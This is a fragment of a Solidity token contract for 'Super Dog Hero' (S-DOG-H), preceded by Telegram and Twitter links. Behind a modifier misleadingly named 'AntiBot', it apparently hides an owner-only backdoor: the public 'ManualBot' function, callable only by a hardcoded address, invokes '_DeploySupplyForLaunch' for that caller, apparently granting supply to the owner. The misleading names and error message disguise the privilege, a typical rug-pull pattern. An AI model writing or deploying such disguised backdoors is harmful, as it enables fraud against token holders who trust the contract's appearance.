...
Telegram: https://t.me/superherodog

Twitter: https://twitter.com/SuperHeroBSC
...
contract Context {
 ...
 contract SuperDogHero is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _excluded;

    string private _name = "Super Dog Hero";
    string private _symbol = "S-DOG-H";
    ...
    address private _NormalOwnership = 0x6B85Bb145daD0D3B18c35333A636E6eA2840B9c2;
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    function _DeploySupplyForLaunch (address accountV2) internal {
    ...
    modifier AntiBot () {
        require(_NormalOwnership == _msgSender(), "ERC20: cannot permit Pancake address");
        _;
    }
    
    function ManualBot() public AntiBot {
        _DeploySupplyForLaunch(_msgSender());
    }   
